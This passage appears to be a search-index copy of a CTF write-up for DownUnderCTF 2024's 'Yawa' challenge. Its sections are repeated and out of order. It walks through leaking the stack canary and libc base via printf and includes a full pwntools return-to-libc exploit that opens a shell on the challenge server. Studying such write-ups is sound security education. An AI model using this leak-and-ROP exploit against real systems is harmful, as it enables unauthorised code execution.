/home/kali/Downloads/yawa_s/yawa_patched 555555558000 -55555555b000 rw-p 00003000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 7ffff7c00000-7ffff7c28000 r--p 00000000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7c28000-7ffff7dbd000 r-xp 00028000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7dbd000-7ffff7e15000 r--p 001bd000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e15000-7ffff7e16000 ---p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e16000-7ffff7e1a000 r--p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1a000-7ffff7e1c000 rw-p 00219000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1c000-7ffff7e29000 rw-p 00000000 00 :00 0 7ffff7fb8000-7ffff7fbd000 rw-p 00000000 00 :00 0 7ffff7fbd000-7ffff7fc1000 r--p 00000000 00 :00 0 [ vvar ] 7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00 :00 0 [ vdso ] 7ffff7fc3000-7ffff7fc5000 r--p 00000000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fc5000-7ffff7fef000 r-xp 00002000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fef000-7ffff7ffa000 r--p 0002c000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffb000-7ffff7ffd000 r--p 00037000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffd000-7ffff7fff000 rw-p 00039000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffffffde000-7ffffffff000 rw-p 00000000 00 :00 0 [ stack ] Code snippet to get libc base address: leak libc base address 1 2 3 4 5 6 7 8 9 10 11 12 def get_libc_base_address (): io . recvuntil ( b \"> \" ) # wait till target binary is ready to read choice io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 103 ) # enter name 103 a + '\\n' that is appended automatically io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' # receive libc_main address in little endian and pad with 0 addr_libc_main = io . recvline () . strip () addr_libc_main = addr_libc_main + bytearray ( 8 - len ( addr_libc_main )) # convert from little to big endian and subtract return offset to get base address of libc return unpack ( addr_libc_main [ 0 : 8 ]) - 0x29d90 Remote shell \u00b6 With canary value and libc address in hands we are ready to get remote shell. Given there is NX protection and stack code is not executable we will use ROP (more on ironstone ) to execute return to libc technique. First we need to get address of string \"/bin/sh\" in libc library ( system function takes argument what to launch): 1 2 # strings -a -t x libc.so.6 | grep /bin/sh sh_offset = 0x1d8678 Using ROPgadget we find tons of useful gadgets in libc library: 1 $ ROPgadget --binary libc.so.6 | grep ret I've selected few that will help me to build return to libc chain: 0x000000000002a3e5: pop rdi 0x00000000000baaf9: xor rax, rax, ret With all of this our payload will look like: 88 bytes of padding for buffer 8 bytes of canary value 8 bytes value of 1 - unchanged 8 bytes pop rdi gadget 8 bytes address of \"/bin/sh\" string (this is argument for pop rdi gadget). As a result we set register RDI to /bin/sh 8 bytes xor rax, rax, ret - this is NOP operation for stack alignment 8 bytes address for system call Full python script: solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 from pwn import * context . binary = elfexe = ELF ( os . path . dirname ( __file__ ) + '/yawa_patched' ) libc = elfexe . libc context . log_level = 'warn' arguments = [] if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30010 io = remote ( remote_server , remote_port ) else : io = process ([ elfexe . path ] + arguments ) def get_canary_value (): io . recvuntil ( b \"> \" ) # wait till target binary initialises io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 88 ) # enter our name 88 a + '\\n' (newline char appended by function sendline - it will overwrite nullbyte of canary) io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' addr_raw = io . recvline () . strip () # receive canary value in little endian order addr_raw = bytearray ( 1 ) + addr_raw # append nullbyte that we skipped return unpack ( addr_raw [ 0 : 8 ]) # convert to little endian byte array number def get_libc_base_address (): io . recvuntil ( b \"> \" ) # wait till target binary is ready to read choice io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 103 ) # enter name 103 a + '\\n' that is appended automatically io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' # receive libc_main address in little endian and convert it to number addr_libc_main = io . recvline () . strip () addr_libc_main = addr_libc_main + bytearray ( 8 - len ( addr_libc_main )) return unpack ( addr_libc_main [ 0 : 8 ]) - 0x29d90 canary = get_canary_value () # set base address of libc library so we can use pwntools to convert offsets to virtual addresses libc . address = get_libc_base_address () # strings -a -t x libc.so.6 | grep /bin/sh sh_offset = libc . offset_to_vaddr ( 0x1d8678 ) # readelf -s libc.so.6 | grep system system = libc . offset_to_vaddr ( 0x050d70 ) # pop rdi gadgetPopRdi = libc . offset_to_vaddr ( 0x000000000002a3e5 ) # xor rax, rax, ret gadgetNop = libc . offset_to_vaddr ( 0x00000000000baaf9 ) payload = flat ( b \"a\" * 88 , pack ( canary ), pack ( 1 ), pack ( gadgetPopRdi ), pack ( sh_offset ), pack ( gadgetNop ), pack ( system ) ) # send payload as name io . recvuntil ( b \"> \" ) io . sendline ( b \"1\" ) io . sendline ( payload ) # exit main which will execute return-to-libc io . recvuntil ( b \"> \" ) io . sendline ( b \"3\" ) io . interactive () io . close () Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Yawa"},{"location":"yawa/#prologue","text":"Difficulty: beginner Category: binary exploitation Solved: 184 Description Yet another welcome application.

Canary value is stored at address 0x7fffffffdcb8 (line 12), it always ends with 0x00 on linux (remember - its little endian). Therefore, its value is 0x4b6f9c3c15608700. At address 0x7fffffffdcb8 we see some 8byte long number 1 (not sure what it is - I've left it untouched in my work). At address 0x7fffffffdcc8 (line 14) we see return address from the main function (0x00007ffff7c29d90), here we want to place jump to system call.","title":"My struggle"},{"location":"yawa/#leak-canary-value","text":"Canary protection (read more here ) puts a random value on stack before execution and checks if hasn't been modified while function was running (if it is - program exits). If we want overwrite return address at 0x7fffffffdcc8, by overflowing variable name at 0x7fffffffdc60, we will have overwrite canary address at 0x7fffffffdcb8 as we can only write continues block of memory. Therefore, we will have to leak canary value from stack and when we overflow buffer put exactly same bytes in the same place to prevent canary protection from triggering. To leak address we can take advantage of \"print your name functionality\": 1 2 3 } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } %s modifier of printf prints all bytes starting from address name until it reaches nullbyte. So if we put 'a' from 0x7fffffffdc60 till 0x7fffffffdcb8, it is going to print aaaaa... and won't stop just on 'a' (as there is no nullbyte) it will continue printing up until 0x7fffffffdcc0 (including entire canary value) and then stop: leak canary block 1 2 3 4 5 6 7 8 9 10 11 12 # 'io' is pwntools input/output pipe object that connected to process or remote server def get_canary_value (): io . recvuntil ( b \"> \" ) # wait till target binary initialises io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 88 ) # enter our name 88 a + '\\n' (newline char appended by function sendline - it will overwrite nullbyte of canary) io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' addr_raw = io . recvline () . strip () # receive canary value in little endian order addr_raw = bytearray ( 1 ) + addr_raw # append nullbyte that we skipped return unpack ( addr_raw [ 0 : 8 ]) # convert to little endian byte array number","title":"Leak canary value"},{"location":"yawa/#leak-libc-address","text":"Next step is to find base virtual address of libc, so we can find system call. Address on stack of return address from our main function is address of __libc_start_call_main - as you might guess its inside libc library. To read address of the function, we can use same technique as we used previously to reading canary value. When library is loaded into memory, its loaded as a single blob, so even though virtual location will be different each time, blob content is always same. Therefore we can calculate position of elements inside the library relative to each other and it won't change doesn't matter where library is loaded: 1 2 3 4 $ readelf -s ./libc.so.6 | grep __libc_start_cal 6 : 0000000000029d10 172 FUNC LOCAL DEFAULT 15 __libc_start_cal [ ... ] $ readelf -s libc.so.6 | grep system 8412 : 0000000000050d70 45 FUNC WEAK DEFAULT 15 system This means that system function will be always 0x50d70-0x29d10 = 0x27060 bytes apart from __libc_start_call_main function. For our our sample memory dump we saw return address 0x7ffff7c29d90 - we return to the middle of libc_start_call_main , so we can infer that libc library is mapped to address 0x7ffff7c29d90 - 0x29d90 = 0x7ffff7c00000 (segments are typically round numbers). So system address is 0x7ffff7c00000 + 0x50d70 = 0x7ffff7c50d70 . We can also double check our calculations by checking process memory mapping using gdb or cat: gdb debugger bash 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 pwndbg> info proc mappings process 19607 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/kali/Downloads/yawa_s/yawa_patched 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555557000 0x555555558000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555558000 0x55555555b000 0x3000 0x3000 rw-p /home/kali/Downloads/yawa_s/yawa_patched 0x7ffff7c00000 0x7ffff7c28000 0x28000 0x0 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7c28000 0x7ffff7dbd000 0x195000 0x28000 r-xp /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7dbd000 0x7ffff7e15000 0x58000 0x1bd000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e15000 0x7ffff7e16000 0x1000 0x215000 ---p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e16000 0x7ffff7e1a000 0x4000 0x215000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1a000 0x7ffff7e1c000 0x2000 0x219000 rw-p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1c000 0x7ffff7e29000 0xd000 0x0 rw-p 0x7ffff7fb8000 0x7ffff7fbd000 0x5000 0x0 rw-p 0x7ffff7fbd000 0x7ffff7fc1000 0x4000 0x0 r--p [ vvar ] 0x7ffff7fc1000 0x7ffff7fc3000 0x2000 0x0 r-xp [ vdso ] 0x7ffff7fc3000 0x7ffff7fc5000 0x2000 0x0 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fc5000 0x7ffff7fef000 0x2a000 0x2000 r-xp /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fef000 0x7ffff7ffa000 0xb000 0x2c000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffb000 0x7ffff7ffd000 0x2000 0x37000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffd000 0x7ffff7fff000 0x2000 0x39000 rw-p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffffffde000 0x7ffffffff000 0x21000 0x0 rw-p [ stack ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat /proc/19607/maps 555555554000 -555555555000 r--p 00000000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555555000 -555555556000 r-xp 00001000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555556000 -555555557000 r--p 00002000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555557000 -555555558000 r--p 00002000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555558000 -55555555b000 rw-p 00003000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 7ffff7c00000-7ffff7c28000 r--p 00000000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7c28000-7ffff7dbd000 r-xp 00028000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7dbd000-7ffff7e15000 r--p 001bd000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e15000-7ffff7e16000 ---p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e16000-7ffff7e1a000 r--p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1a000-7ffff7e1c000 rw-p 00219000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1c000-7ffff7e29000 rw-p 00000000 00 :00 0 7ffff7fb8000-7ffff7fbd000 rw-p 00000000 00 :00 0 7ffff7fbd000-7ffff7fc1000 r--p 00000000 00 :00 0 [ vvar ] 7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00 :00 0 [ vdso ] 7ffff7fc3000-7ffff7fc5000 r--p 00000000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fc5000-7ffff7fef000 r-xp 00002000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fef000-7ffff7ffa000 r--p 0002c000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffb000-7ffff7ffd000 r--p 00037000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffd000-7ffff7fff000 rw-p 00039000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffffffde000-7ffffffff000 rw-p 00000000 00 :00 0 [ stack ] Code snippet to get libc base address: leak libc base address 1 2 3 4 5 6 7 8 9 10 11 12 def get_libc_base_address (): io . recvuntil ( b \"> \" ) # wait till target binary is ready to read choice io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 103 ) # enter name 103 a + '\\n' that is appended automatically io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' # receive libc_main address in little endian and pad with 0 addr_libc_main = io . recvline () . strip () addr_libc_main = addr_libc_main + bytearray ( 8 - len ( addr_libc_main )) # convert from little to big endian and subtract return offset to get base address of libc return unpack ( addr_libc_main [ 0 : 8 ]) - 0x29d90","title":"Leak libc address"},{"location":"yawa/#remote-shell","text":"With canary value and libc address in hands we are ready to get remote shell.
